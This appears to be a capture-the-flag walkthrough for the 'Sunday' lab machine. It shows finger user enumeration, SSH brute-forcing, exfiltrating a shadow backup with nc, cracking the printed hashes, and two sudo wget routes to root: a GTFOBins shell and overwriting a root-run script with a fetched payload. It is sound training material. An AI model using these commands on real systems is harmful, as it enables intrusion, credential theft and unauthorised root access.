---
layout: post
title: "sunday"
date: 2025-09-05 
categories: OSCP Playlist
---
# sunday

## Summary:

- Enumerate finger service to find valid logged on users
- rustscan to find hidden ssh port
- hashcat/john to bruteforce shadow backup file
- gtfobin to exploit wget
- wget -i to read script allowed for sunny, replace script with our own, then execute with sudo privilege to get root

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/sunday 10.10.10.76

PORT    STATE SERVICE VERSION
79/tcp  open  finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp open  rpcbind 2-4 (RPC #100000)
515/tcp open  printer
```

We know there are scripts that can enumerate finger service for users, the finger service can tell us who is logged on on the machine. First let’s try metasploit.

```bash
msfconsole
search finger
user auxiliary/scanner/finger/finger_users
set RHOSTS 10.10.10.76
```

However, metasploit does not show whether users found are false positives or not.

Let’s try finger-user-enum from pentest monkey:

```bash
git clone https://github.com/pentestmonkey/finger-user-enum
```

```bash
./finger-user-enum.pl

finger-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )
```

```bash
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
```

To make it look nicer, we can pipe the output to less and cut off long lines

```bash
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76 | less -S

bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
ike@10.10.10.76: ikeuser  IKE Admin                          < .  .  .  . >..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
root@10.10.10.76: root     Super-User            ssh          <Dec  7, 2023> 10.10.14.46         ..
sammy@10.10.10.76: sammy           ???            ssh          <May  6 07:35> 10.10.14.68         ..
sunny@10.10.10.76: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
```

- **Pseudo-terminals (pts/X)**: These are virtual terminals typically associated with remote login sessions, such as those via **SSH**, **telnet**, or graphical terminal emulators. When a user logs in remotely, they are assigned a pseudo-terminal (e.g., pts/0, pts/1). Seeing a pts entry in the finger output strongly suggests the user is **actively logged in** via a remote session.
- **Other terminals (e.g., ttyX, console, or none)**:
    - Physical terminals (ttyX): These are associated with direct, physical access to the machine (e.g., a console or serial port). They are less common in modern systems, especially for remote users.

We see users with ssh are sammy, sunny and root. Since the box is called sunday, let’s attempt to bruteforce sunny first. However, right now there are no ssh port even though sunny is logged in via ssh. Let’s do another scan:

```bash
rustscan -a 10.10.10.76

79/tcp    open  finger    syn-ack ttl 59
111/tcp   open  rpcbind   syn-ack ttl 63
515/tcp   open  printer   syn-ack ttl 59
6787/tcp  open  smc-admin syn-ack ttl 59
22022/tcp open  unknown   syn-ack ttl 63
```

We input the port into nmap again and 22022 is ssh. We can bruteforce find the password with patator, since hydra will not output valid results due to downgrade of ssh key authencation.

```bash
patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-1575.txt persistent=0 -x ignore:fgrep='failed'

10:11:41 patator    INFO - 0     19     0.193 | sunday                             |   880 | SSH-2.0-OpenSSH_8.4

```

Password could also be guessed as sunday:

```bash
ssh sunny@10.10.10.76 -p 22022
```

We are in. Let’s enumerate:

```bash
id

uid=101(sunny) gid=10(staff)

cat .bash_history

su -
su -
cat /etc/resolv.conf 
su -
ps auxwww|grep overwrite
su -
sudo -l
sudo /root/troll
ls /backup
ls -l /backup
cat /backup/shadow.backup
sudo /root/troll
sudo /root/troll
su -
sudo -l
sudo /root/troll
ps auxwww
ps auxwww
ps auxwww
top
top
top
ps auxwww|grep overwrite
su -
su -
cat /etc/resolv.conf 
ps auxwww|grep over
sudo -l
sudo /root/troll
sudo /root/troll
sudo /root/troll
sudo /root/troll

```

Let’s check our sudo privileges as well:

```bash
sudo -l 

User sunny may run the following commands on sunday:
    (root) NOPASSWD: /root/troll
```

Let’s try executing it:

```bash
sudo /root/troll

testing
uid=0(root) gid=0(root)

```

Let’s also see what files belong to group staff

```bash
find / -group staff 2>/dev/null

#interesting findings:
/var/share/user/root
/var/share/user/101
/var/share/user/100
/var/share/user/sammy
/var/share/adm/lastlog
/tmp/volatile-user/101
```

Nothing useful. Looking back at history, we see a /backup dir:

```bash
ls -l /backup

total 4
-rw-r--r--   1 root     root         319 Dec 19  2021 agent22.backup
-rw-r--r--   1 root     root         319 Dec 19  2021 shadow.backup
```

We can read it. Let’s transfer the files back and attempt to bruteforce crack it:

```bash
cd /backup
python3 -m http.server 8000

#on attack host
wget http://10.10.10.76/agent22.backup
wget http://10.10.10.76/shadow.backup
```

We are blocked. Let’s try nc:

```bash
#on attack host:
nc -lnvp 1234 > shadow.backup

#on target
nc 10.10.16.7 1234 < shadow.backup

#now verify
md5sum shadow.backup
854b069771ffb8388d5dbeec5ae907db

#now do the same for agent22.backup
nc -lnvp 1234 > agent22.backup

nc 10.10.16.7 1234 < agent22.backup
```

Looking in the files, they look the same:

```bash
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Let’s crack it:

```bash
.\hashcat.exe wordlists\admin_hash.txt wordlists\rockyou.txt
```

Or, with john:

```bash
john shadow.backup --wordlist=/usr/share/wordlists/rockyou.txt
```

We got the password:

```bash
sammy:cooldude!
```

Let’s switch user:

```bash
su sammy
```

Let’s check our sudo privilegs:

```bash
sudo -l
(root) NOPASSWD: /usr/bin/wget
```

Searching wget on GTFObin, we get steps to root.

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo /usr/bin/wget --use-askpass=$TF 0
```

We now have root shell.

![image.png]({{ site.baseurl }}/assets/sunday/image.png)

Another way to get root is reading what the script /root/troll does. Since we have sudo privilege, we can use wget to take a file as input:

```bash
sudo wget /root/troll

/root/troll: Invalid URL http://#!/usr/bin/bash: Invalid host name
/root/troll: Invalid URL /usr/bin/echo "testing": Scheme missing
/root/troll: Invalid URL /usr/bin/id: Scheme missing
```

Now just create a script e.g. troll with content:

```bash
#!/bin/bash

bash
```

Now host a python server:

```bash
python3 -m http.server 8001

#on target
sudo wget -O /root/troll http://10.10.16.7:8001/troll
```

Then execute it as sunny:

```bash
sudo /root/troll
```